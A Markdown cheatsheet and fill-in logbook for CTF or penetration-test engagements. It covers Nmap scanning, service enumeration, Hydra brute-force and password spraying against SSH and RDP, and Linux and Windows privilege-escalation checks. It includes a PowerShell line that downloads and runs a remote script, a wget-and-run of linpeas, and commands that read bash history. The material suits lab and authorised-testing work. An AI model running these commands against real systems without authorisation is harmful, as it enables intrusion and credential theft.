# CTF/Pentest Cheatsheet
A simple cheatsheet. :D
---

## Logbook
For entering details about the engagement in general.
### Host Information
- **IP**
    ```bash
    <insert ip here>
    ```
- **Web Domain (if applicable)**
    ```bash
    <insert domain here>
    ```
- **Scans**
    - **Nmap**
        - **Quick Scan**
            ```bash
            sudo nmap $IP_ADDRESS -oA nmap/quickscan
            ```
            ```bash
            <insert quick scan output here>
            ```
        - **Full Scan**
            ```bash
            sudo nmap -A -p- $IP_ADDRESS -oA nmap/fullscan
            ```
            ```bash
            <insert full scan output here>
            ```
        - **UDP Scan**
            ```bash
            sudo nmap -sU $IP_ADDRESS -oA nmap/udpscan
            ```
            ```bash
            <insert udp scan output here>
            ```
    - **Searchsploit**
        ```bash
        searchsploit --nmap nmap/fullscan.xml > results.txt
        ```
        ```bash
        <insert results here>
        ```

---

## Enumeration

### TCP

#### 22 - SSH
- **ssh-audit**
    ```bash
    ssh-audit.py $IP_ADDRESS
    ```
    ```bash
    <insert ssh-audit output here>
    ```
- **Hydra (Brute Force SSH Login)**
    ```bash
    hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt ssh://$IP_ADDRESS:$PORT -t 4 -V
    ```
    ```bash
    <insert hydra output here>
    ```
- **Password Spraying (if there’s a known password)**
    ```bash
    hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$PASSWORD" ssh://$IP_ADDRESS
    ```
    ```bash
    <insert hydra output here>
    ```

#### 25 - SMTP
- **Nmap SMTP Script Scan**
    ```bash
    nmap -p 25 --script smtp* $IP_ADDRESS
    ```
    ```bash
    <insert nmap output here>
    ```
- **Metasploit SMTP Enumeration**
    ```bash
    use auxiliary/scanner/smtp/smtp_version
    set RHOSTS $IP_ADDRESS
    run
    ```
    ```bash
    <insert msfconsole output here>
    ```
- **SMTP VRFY Command**
    ```bash
    telnet $IP_ADDRESS 25
    VRFY <email_address>
    ```

#### 80 - HTTP
- **Nikto**
    ```bash
    nikto -h http://$IP_ADDRESS
    ```
    ```bash
    <insert nikto output here>
    ```
- **DirBuster (Directory Bruteforce)**
    ```bash
    dirbuster -u http://$IP_ADDRESS -l /usr/share/dirb/wordlists/common.txt
    ```
    ```bash
    <insert dirbuster output here>
    ```
- **Wappalyzer (Web Technology Fingerprinting)**
    ```bash
    wappalyzer http://$IP_ADDRESS
    ```
    ```bash
    <insert wappalyzer output here>
    ```
- **Sitemaps**
    - **robots.txt**
        ```bash
        curl http://$IP_ADDRESS/robots.txt
        ```
        ```bash
        <insert robots.txt output here>
        ```
    - **sitemap.xml**
        ```bash
        curl http://$IP_ADDRESS/sitemap.xml
        ```
        ```bash
        <insert sitemap.xml output here>
        ```
- **WPScan (WordPress Enumeration)**
    ```bash
    wpscan --url http://$IP_ADDRESS
    ```
    ```bash
    <insert wpscan output here>
    ```
- **Page Source Inspection**
    ```bash
    curl http://$IP_ADDRESS
    ```
    ```bash
    <insert page source here>
    ```

#### 139/445 - NetBIOS/SMB
- **Enum4Linux (SMB Enumeration)**
    ```bash
    enum4linux -a $IP_ADDRESS
    ```
    ```bash
    <insert enum4linux output here>
    ```
- **Smbclient (SMB Share Discovery)**
    ```bash
    smbclient -L //$IP_ADDRESS -U guest
    ```
    ```bash
    <insert smbclient output here>
    ```

#### 3389 - RDP
- **Hydra (RDP Brute Force)**
    ```bash
    hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt rdp://$IP_ADDRESS:$PORT -t 4 -V
    ```
    ```bash
    <insert hydra output here>
    ```
- **Password Spraying (if there’s a known password)**
    ```bash
    hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$PASSWORD" rdp://$IP_ADDRESS
    ```
    ```bash
    <insert hydra output here>
    ```
- **Connecting to RDP**
    ```bash
    xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[WINDOWS IP]
    ```
    ```bash
    <insert rdp session output here>
    ```

#### 53 - DNS
- **DNS Zone Transfer (AXFR)**
    ```bash
    dig @<DNS_SERVER> $DOMAIN_NAME axfr
    ```
    ```bash
    <insert zone transfer output here>
    ```
- **DNS Recon (Subdomain Enumeration)**
    ```bash
    dnsrecon -d $DOMAIN_NAME
    ```
    ```bash
    <insert dnsrecon output here>
    ```

### UDP

#### 25 - SNMP
- **onesixtyone (SNMP Enumeration)**
    ```bash
    onesixtyone -c community.txt $IP_ADDRESS
    ```
    ```bash
    <insert onesixtyone output here>
    ```
- **snmpwalk (SNMP Walk)**
    ```bash
    snmpwalk -v 2c -c public $IP_ADDRESS
    ```
    ```bash
    <insert snmpwalk output here>
    ```

#### 161 - SNMP (Advanced Enumeration)
- **snmpenum**
    ```bash
    snmpenum -v 2c -c public $IP_ADDRESS
    ```
    ```bash
    <insert snmpenum output here>
    ```

#### 161/162 - SNMP Trap
- **SnmpTrap (Listen for SNMP Traps)**
    ```bash
    snmptrapd -f -Lo
    ```
    ```bash
    <insert snmptrap output here>
    ```

#### 123 - NTP
- **NTP Enumeration**
    ```bash
    ntpdc -c sysinfo $IP_ADDRESS
    ```
    ```bash
    <insert ntpdc output here>
    ```

---

## Exploitation

- **Service Exploited**
    ```bash
    <insert service exploited here>
    ```
- **Vulnerability**
    ```bash
    <insert vulnerability here>
    ```
- **PoC (Proof of Concept)**
    ```bash
    <insert PoC here>
    ```
- **Description**
    ```bash
    <insert description of the exploit here>
    ```

---

## Privilege Escalation

### Linux

- **System Info**
    - **Kernel**
        ```bash
        uname -r
        ```
        ```bash
        <insert kernel version here>
        ```
    - **Services**
        ```bash
        ps aux
        ```
        ```bash
        <insert services here>
        ```
    - **Users**
        ```bash
        whoami
        ```
        ```bash
        <insert username here>
        ```

- **History**
    ```bash
    cat ~/.bash_history
    ```
    ```bash
    <insert bash history here>
    ```

- **sudo -l (List Sudo Permissions)**
    ```bash
    sudo -l
    ```
    ```bash
    <insert sudo permissions here>
    ```

- **SUIDs**
    ```bash
    find / -type f -perm /4000 2>/dev/null
    ```
    ```bash
    <insert suid files here>
    ```

- **Cronjobs**
    ```bash
    cat /etc/crontab
    ```
    ```bash
    <insert cronjobs here>
    ```

- **Linpeas**
    ```bash
    wget https://github.com/carlospolop/PEASS-ng/releases/download/2021.02.20/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```
    ```bash
    <insert linpeas output here>
    ```

### Windows

- **Winpeas**
    ```bash
    powershell -exec bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://$IP_ADDRESS/winpeas.ps1'))"
    ```
    ```bash
    <insert winpeas output here>
    ```

---

## Loot

- **Credentials**
    ```bash
    <insert credentials here>
    ```
- **Hashes**
    - **Uncracked**
        ```bash
        <insert uncracked hashes here>
        ```
    - **Cracked**
        ```bash
        <insert cracked hashes here>
        ```
- **Flags**
    - **user.txt**
        ```bash
        <insert user.txt contents here>
        ```
    - **root.txt**
        ```bash
        <insert root.txt contents here>
        ```
